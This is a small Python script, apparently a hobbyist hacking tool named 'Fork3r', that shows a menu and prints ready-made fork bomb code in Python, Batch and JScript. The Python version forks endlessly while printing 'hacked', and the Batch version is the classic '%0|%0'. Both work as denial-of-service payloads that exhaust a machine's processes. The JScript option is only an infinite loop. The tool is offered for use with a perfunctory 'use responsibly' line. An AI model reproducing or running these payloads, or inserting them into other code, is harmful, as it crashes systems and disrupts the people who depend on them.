#!usr/bin/python3
print("""
███████╗ ██████╗ ██████╗ ██╗  ██╗██████╗ ██████╗ 
██╔════╝██╔═══██╗██╔══██╗██║ ██╔╝╚════██╗██╔══██╗
█████╗  ██║   ██║██████╔╝█████╔╝  █████╔╝██████╔╝
██╔══╝  ██║   ██║██╔══██╗██╔═██╗  ╚═══██╗██╔══██╗
██║     ╚██████╔╝██║  ██║██║  ██╗██████╔╝██║  ██║
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝                                                 
Create fork bombs with ease.
Creator - JothaM123.
With great power comes great responsibility. Use responsibly.
""")
print("""
Choose a language.
[1] Python [.py]
[2] Batch  [.bat]
[3] JScript[.js]
""")

while 1:
	choose = input("Choose a language - ")

	if choose == "1":
		print("""For bomb in Python.
┌─────────────────────────────────────┐
│#!/usr/bin/python3                   │
│import os                            │
│while True:                          │
│    os.fork()                        │
│    print("hacked")                  │
│    os.fork()                        │
│    print("hacked")                  │
└─────────────────────────────────────┘
		""")

	elif choose == "2":
		print("""Fork bomb in Batch
┌─────────────────────────────────────┐
│                                     │
│%0|%0                                │
│                                     │
└─────────────────────────────────────┘
		""")
	
	elif choose == "3":
		print("""Fork bomb in Javascript
┌─────────────────────────────────────┐
│var a = 1                            │
│while (1){a = a+1}                   │
│                                     │
└─────────────────────────────────────┘
		""")

	else:
		print("""
Unknown option
		""")
